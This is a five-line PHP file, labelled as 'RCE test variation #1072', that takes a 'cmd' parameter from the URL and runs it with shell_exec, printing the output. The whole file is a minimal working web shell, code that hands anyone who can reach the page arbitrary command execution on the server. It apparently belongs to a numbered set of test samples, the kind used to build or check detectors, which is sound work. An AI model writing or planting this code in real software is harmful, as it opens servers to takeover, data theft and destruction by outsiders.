<?php
// RCE test variation #1072
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>